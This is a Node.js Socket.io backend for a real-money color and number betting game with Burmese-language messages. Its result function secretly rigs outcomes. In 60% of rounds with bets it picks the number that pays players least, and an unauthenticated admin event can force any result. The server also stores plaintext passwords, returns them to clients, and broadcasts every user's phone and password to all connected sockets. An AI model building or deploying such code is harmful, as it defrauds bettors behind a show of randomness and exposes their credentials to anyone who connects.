const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static(__dirname + '/public'));

let manualTargetResult = "AUTO"; 
let users = {};         
let currentBets = [];   
let gameSeconds = 30;
let gamePeriod = 1;
let gameHistory = [];

io.on('connection', (socket) => {
  console.log('User connected:', socket.id);

  socket.emit("init_data", {
    history: gameHistory,
    period: String(gamePeriod),
    timer: gameSeconds
  });

  // =========================
  // LOGIN
  // =========================
  socket.on('user_login', (data) => {
    const { phone, pass } = data || {};

    if (!phone || !pass) {
      return socket.emit('auth_response', {
        success: false,
        message: 'အကောင့်အမည်နှင့် စကားဝှက် ဖြည့်ပါ'
      });
    }

    const user = users[phone];

    if (!user) {
      return socket.emit('auth_response', {
        success: false,
        message: 'အကောင့်မတွေ့ပါ။ Register အရင်လုပ်ပါ။'
      });
    }

    if (user.pass !== pass) {
      return socket.emit('auth_response', {
        success: false,
        message: 'စကားဝှက် မှားနေပါတယ်'
      });
    }

    socket.emit('auth_response', {
      success: true,
      message: 'Login အောင်မြင်ပါတယ်',
      user: {
        phone: user.phone,
        pass: user.pass,
        balance: user.balance || 0
      }
    });
  });

  // =========================
  // REGISTER
  // =========================
  socket.on('user_register', (data) => {
    const { phone, pass } = data || {};

    if (!phone || !pass) {
      return socket.emit('auth_response', {
        success: false,
        message: 'အကောင့်အမည်နှင့် စကားဝှက် ဖြည့်ပါ'
      });
    }

    if (users[phone]) {
      return socket.emit('auth_response', {
        success: false,
        message: 'ဒီအကောင့် ရှိပြီးသားပါ။ Login ဝင်ပါ။'
      });
    }

    users[phone] = { phone: phone, pass: pass, balance: 0 };

    socket.emit('auth_response', {
      success: true,
      message: 'Register အောင်မြင်ပါတယ်',
      user: { phone: phone, pass: pass, balance: 0 }
    });

    sendAdminStats();
  });

  // =========================
  // PLACE BET
  // =========================
  socket.on('place_bet', (data) => {
    const { phone, betType, amount } = data || {};
    const user = users[phone];

    if (!user) {
      return socket.emit('bet_response', {
        success: false,
        message: 'ကျေးဇူးပြု၍ လော့ဂ်အင် ပြန်ဝင်ပါ။'
      });
    }

    const betAmount = parseInt(amount);
    if (isNaN(betAmount) || betAmount <= 0) {
      return socket.emit('bet_response', {
        success: false,
        message: 'မှန်ကန်သော ပမာဏ ဖြည့်ပါ။'
      });
    }

    if (user.balance < betAmount) {
      return socket.emit('bet_response', {
        success: false,
        message: 'လက်ကျန်ငွေ မလုံလောက်ပါ! ကျေးဇူးပြု၍ ငွေထပ်သွင်းပါ။'
      });
    }

    if (gameSeconds <= 5) {
      return socket.emit('bet_response', {
        success: false,
        message: 'ပွဲစဉ်ပိတ်ခါနီးဖြစ်၍ လောင်းကြေး ပိတ်ထားပါသည်။'
      });
    }

    user.balance -= betAmount;

    currentBets.push({
      phone: phone,
      betType: String(betType).toUpperCase(),
      amount: betAmount,
      period: String(gamePeriod)
    });

    socket.emit('bet_response', {
      success: true,
      message: 'လောင်းကြေး တင်ပြီးပါပြီ!',
      newBalance: user.balance
    });
    socket.emit('balance_sync', user.balance);

    sendAdminStats();
  });

  socket.on('admin_set_target_result', (data) => {
    manualTargetResult = data.target;
  });

  socket.on('admin_update_balance', (data) => {
    const { phone, amount } = data;
    if (phone && !isNaN(amount)) {
      if (!users[phone]) {
        users[phone] = { phone: phone, pass: '123456', balance: 0 };
      }
      users[phone].balance += amount;
      sendAdminStats();
      io.emit('balance_sync', users[phone].balance);
    }
  });

  function sendAdminStats() {
    const onlineCount = io.engine.clientsCount;
    const userList = Object.values(users);

    let betSummary = {};
    currentBets.forEach(b => {
      betSummary[b.betType] = (betSummary[b.betType] || 0) + b.amount;
    });

    let topBetText = currentBets.length > 0 
      ? Object.entries(betSummary).map(([type, amt]) => `${type}: K${amt}`).join(' | ') 
      : "လက်ရှိ ပွဲစဉ်တွင် လောင်းကြေး မရှိသေးပါ";

    io.emit('admin_stats_update', {
      onlineCount: onlineCount,
      topBetInfo: topBetText,
      users: userList
    });
  }

  sendAdminStats();

  socket.on('disconnect', () => {
    sendAdminStats();
  });
});

// ==========================================
// 60% / 40% PROFIT ALGORITHM & RESULT CALCULATION
// ==========================================
function calculateGameResult() {
  let finalNumber;

  if (manualTargetResult !== "AUTO") {
    finalNumber = parseInt(manualTargetResult);
    manualTargetResult = "AUTO"; 
  } else if (currentBets.length > 0) {
    // လောင်းကြေးရှိလျှင် - ဒိုင်အတွက် 60% တွက်ချက်မည်
    let totalBetsAmount = currentBets.reduce((sum, b) => sum + b.amount, 0);
    let possibleResults = [];

    for (let num = 0; num <= 9; num++) {
      let color = 'green';
      if (num === 0) color = 'violet-red';
      else if (num === 5) color = 'violet-green';
      else if (num % 2 === 0) color = 'red';

      let size = num >= 5 ? 'BIG' : 'SMALL';
      let totalPayout = 0;

      // တိုင်ပွဲတစ်ခုချင်းစီ၏ အနိုင်ကြေး တွက်ထုတ်ခြင်း
      currentBets.forEach(b => {
        if (String(num) === b.betType) totalPayout += b.amount * 9;
        else if (b.betType === size) totalPayout += b.amount * 2;
        else if (b.betType === 'GREEN' && color === 'green') totalPayout += b.amount * 2;
        else if (b.betType === 'GREEN' && color === 'violet-green') totalPayout += b.amount * 1.5;
        else if (b.betType === 'RED' && color === 'red') totalPayout += b.amount * 2;
        else if (b.betType === 'RED' && color === 'violet-red') totalPayout += b.amount * 1.5;
        else if (b.betType === 'VIOLET' && (num === 0 || num === 5)) totalPayout += b.amount * 4.5;
      });

      possibleResults.push({ number: num, payout: totalPayout });
    }

    // Payout နိမ့်ဆုံးနံပါတ်များကို စီစဉ်ခြင်း
    possibleResults.sort((a, b) => a.payout - b.payout);

    // 60% Chance: ဒိုင် အမြတ်အများဆုံးရမည့် (Payout အနည်းဆုံး) နံပါတ် ထုတ်ပေးမည်
    // 40% Chance: သာမန် Random ကျစေမည်
    let isHouseWinRate = Math.random() < 0.60;

    if (isHouseWinRate) {
      finalNumber = possibleResults[0].number;
    } else {
      finalNumber = Math.floor(Math.random() * 10);
    }
  } else {
    // လောင်းကြေးမရှိပါက Random
    finalNumber = Math.floor(Math.random() * 10);
  }

  let color = 'green';
  if (finalNumber === 0) color = 'violet-red';
  else if (finalNumber === 5) color = 'violet-green';
  else if (finalNumber % 2 === 0) color = 'red';

  let size = finalNumber >= 5 ? 'BIG' : 'SMALL';

  return { number: finalNumber, color: color, size: size };
}

function processPayouts(result) {
  currentBets.forEach(bet => {
    const user = users[bet.phone];
    if (!user) return;

    let winRatio = 0;

    if (String(result.number) === bet.betType) winRatio = 9;
    else if (bet.betType === result.size) winRatio = 2;
    else if (bet.betType === 'GREEN') {
      if (result.color === 'green') winRatio = 2;
      else if (result.color === 'violet-green') winRatio = 1.5;
    }
    else if (bet.betType === 'RED') {
      if (result.color === 'red') winRatio = 2;
      else if (result.color === 'violet-red') winRatio = 1.5;
    }
    else if (bet.betType === 'VIOLET' && (result.number === 0 || result.number === 5)) winRatio = 4.5;

    let isWin = winRatio > 0;
    let winAmount = isWin ? bet.amount * winRatio : 0;

    if (isWin) {
      user.balance += winAmount;
    }

    io.emit('user_bet_settled', {
      phone: user.phone,
      period: bet.period,
      betType: bet.betType,
      amount: bet.amount,
      win: isWin,
      winAmount: winAmount,
      newBalance: user.balance
    });
  });

  currentBets = [];
}

setInterval(() => {
  gameSeconds--;

  if (gameSeconds <= 0) {
    const result = calculateGameResult();

    const historyItem = {
      period: String(gamePeriod),
      number: result.number,
      color: result.color,
      size: result.size
    };

    processPayouts(result);

    gameHistory.unshift(historyItem);
    if (gameHistory.length > 50) gameHistory.pop();

    io.emit("game_result", historyItem);

    gamePeriod++;
    gameSeconds = 30;
  }

  io.emit("timer_update", {
    timer: gameSeconds,
    period: String(gamePeriod)
  });

}, 1000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Lucky Lottery server running on port ${PORT}`);
});

